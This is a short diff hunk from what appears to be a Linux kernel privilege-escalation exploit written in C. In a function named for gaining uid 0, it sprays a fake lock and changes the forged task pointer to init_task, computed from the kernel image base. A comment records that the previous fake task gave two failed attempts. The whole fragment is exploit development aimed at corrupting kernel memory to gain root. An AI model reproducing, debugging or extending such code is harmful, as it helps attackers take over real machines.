@@ -1902,7 +1902,8 @@ static void uid0_w2_overlay(void) {
    */
   if (env_flag("UID0_SPRAY_LOCK", 0) && page_base) {
     fake_lock = page_base;
-    fake_task = page_base + FAKE_TASK_OFF;
+    fake_task = data_addr(KIMAGE_TEXT_BASE + it_off); /* init_task P0 —
+      page_base+FAKE_TASK_OFF is NOT a valid task (2x success=0) */
     pr_info("W2 overlay SPRAYED lock=%016zx task=%016zx\n",
             fake_lock, fake_task);
     pselect_child_node = 1;
